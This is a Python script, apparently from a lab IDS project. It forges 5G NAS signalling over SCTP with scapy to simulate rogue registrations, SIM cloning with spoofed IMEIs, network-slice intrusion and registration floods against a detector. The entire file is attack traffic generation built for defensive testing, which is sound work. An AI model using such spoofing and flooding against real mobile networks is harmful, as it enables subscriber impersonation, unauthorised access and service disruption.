#!/usr/bin/env python3
"""
NASWatch 5G attack tool — terminal-driven NAS signalling injector.

Forces forged 5G control-plane signalling onto the wire so the NASWatch IDS
can be exercised with *live* attacker traffic (no UI buttons involved).

Typical use (inside the lab network namespace, e.g. the api container):

    # 1. start the IDS live-capture (separate terminal)
    docker compose exec naswatch-api python scripts/run_pipeline.py --mode live --interface lo

    # 2. attack
    docker compose exec naswatch-api python scripts/attack_5g.py --scenario all

Scenarios
---------
    legitimate        Alice registers with the correct IMEI   -> no alert
    rogue             unknown IMSI registers                  -> ROGUE_DEVICE (CRITICAL)
    suspended         suspended subscriber re-registers       -> ROGUE_DEVICE (CRITICAL)
    sim-clone         known IMSI on a spoofed IMEI            -> IDENTITY_SPOOFING (HIGH)
    slice-intrusion   subscriber asks for an unowned slice    -> SLICE_INTRUSION (MEDIUM)
    flood             burst of registrations                  -> rate/flood visibility
    all               run every scenario above

This is a security-testing/authorised-lab tool. Do not run it against networks
you do not own.
"""

from __future__ import annotations

import argparse
import sys
import time

# --- 5G NAS message builders (5GS NAS, TS 24.501, plain/textbook encoding) ---


def encode_bcd(imsi: str) -> bytes:
    """Encode decimal digits in the 3GPP BCD nibble-swapped layout."""
    if len(imsi) % 2 != 0:
        imsi += "f"
    out = bytearray()
    for i in range(0, len(imsi), 2):
        low = int(imsi[i], 16)
        high = int(imsi[i + 1], 16)
        out.append((high << 4) | low)
    return bytes(out)


def nas_registration_request(imsi: str) -> bytes:
    """5GS Registration Request (MM msg 0x41) carrying a SUCI/IMSI identity."""
    bcd = encode_bcd(imsi)
    mobile_id = b"\x01\x00\x00\x00\x00" + bcd  # 0x01 = SUPI/IMSI
    return bytes(bytearray([0x7E, 0x00, 0x41, 0x01]) + len(mobile_id).to_bytes(2, "big") + mobile_id)


def nas_identity_response(imsi: str | None = None, imei: str | None = None) -> bytes:
    """5GS Identity Response (MM msg 0x5B) carrying an IMSI or IMEI."""
    if imsi:
        mob_id = b"\x01\x00\x00\x00\x00" + encode_bcd(imsi)
    elif imei:
        mob_id = b"\x03" + encode_bcd(imei)  # 0x03 = IMEI
    else:
        mob_id = b"\x01\x00"
    return bytes(bytearray([0x7E, 0x00, 0x5B]) + len(mob_id).to_bytes(2, "big") + mob_id)


def nas_security_mode_complete(imeisv: str) -> bytes:
    """5GS Security Mode Complete (MM msg 0x56) with an embedded IMEISV IE (0x77)."""
    bcd = encode_bcd(imeisv)
    return bytes(bytearray([0x7E, 0x00, 0x56, 0x77, len(bcd)]) + bcd)


def nas_pdu_session_request(sst: int, sd: str | None = None) -> bytes:
    """5GS PDU Session Establishment Request (SM msg 0xC1) with an S-NSSAI IE (0x22)."""
    payload = bytearray([0x2E, 0x00, 0xC1, 0x01])
    if sd:
        sd_bytes = bytes.fromhex(sd.replace("0x", "").zfill(6))
        payload += bytearray([0x22, 0x04, sst]) + sd_bytes
    else:
        payload += bytearray([0x22, 0x01, sst])
    return bytes(payload)


# --- packet transport -------------------------------------------------------


def send_nas(nas_payload: bytes, args) -> None:
    """Wrap a raw NAS PDU in IP/SCTP(:38412) and put it on the wire."""
    from scapy.all import IP, SCTP, Raw, send

    pkt = (
        IP(src=args.src, dst=args.dst)
        / SCTP(sport=38412, dport=38412, tag=args.tag)
        / Raw(load=nas_payload)
    )
    send(pkt, iface=args.iface, verbose=False)
    args.tag = (args.tag + 1) & 0xFFFFFFFF


SCENARIOS = {
    "legitimate": "Legitimate subscriber (Alice) — should NOT alert",
    "rogue": "Rogue / unknown subscriber",
    "suspended": "Suspended subscriber access attempt",
    "sim-clone": "SIM cloning — known IMSI, spoofed IMEI",
    "slice-intrusion": "Unauthorized network-slice request",
    "flood": "Registration flood / DoS burst",
}


def run_scenario(name: str, args) -> None:
    if name == "legitimate":
        send_nas(
            nas_registration_request("999700000000001")
            + nas_security_mode_complete("8601234567890120"),
            args,
        )
        print("  [+] legitimate registration from Alice (correct IMEI)")
    elif name == "rogue":
        send_nas(nas_registration_request("999700000000999"), args)
        print("  [x] rogue registration: unknown IMSI 999700000000999")
    elif name == "suspended":
        send_nas(nas_registration_request("999700000000003"), args)
        print("  [x] suspended subscriber 999700000000003 attempts to attach")
    elif name == "sim-clone":
        send_nas(
            nas_registration_request("999700000000001")
            + nas_security_mode_complete("8699999999999990"),
            args,
        )
        print("  [x] SIM clone: IMSI 999700000000001 with spoofed IMEI 869999999999999")
    elif name == "slice-intrusion":
        send_nas(
            nas_identity_response(imsi="999700000000002")
            + nas_pdu_session_request(sst=2, sd="000002"),
            args,
        )
        print("  [x] slice intrusion: 999700000000002 requests SST 2 / SD 000002")
    elif name == "flood":
        burst = args.flood_count
        print(f"  [x] registration flood: {burst} registrations ...")
        for _ in range(burst):
            send_nas(nas_registration_request("999700000000001"), args)
            time.sleep(0.01)
    else:
        raise SystemExit(f"unknown scenario: {name}")


def main() -> int:
    parser = argparse.ArgumentParser(description="NASWatch 5G NAS attack tool")
    parser.add_argument("--scenario", default="all", choices=["all", *SCENARIOS.keys()])
    parser.add_argument("--iface", default="lo", help="egress interface (default: lo)")
    parser.add_argument("--src", default="127.0.0.11", help="source IP (gNB side)")
    parser.add_argument("--dst", default="127.0.0.5", help="destination IP (AMF)")
    parser.add_argument("--flood-count", type=int, default=25, help="registrations for the flood scenario")
    args = parser.parse_args()

    args.tag = 0x00000001
    names = list(SCENARIOS) if args.scenario == "all" else [args.scenario]

    print(f"NASWatch 5G attack tool -> {args.dst}:38412 over iface {args.iface}")
    for name in names:
        print(f"* scenario: {name} — {SCENARIOS.get(name, '')}")
        run_scenario(name, args)
        time.sleep(0.2)
    print("attack complete.")


if __name__ == "__main__":
    sys.exit(main())
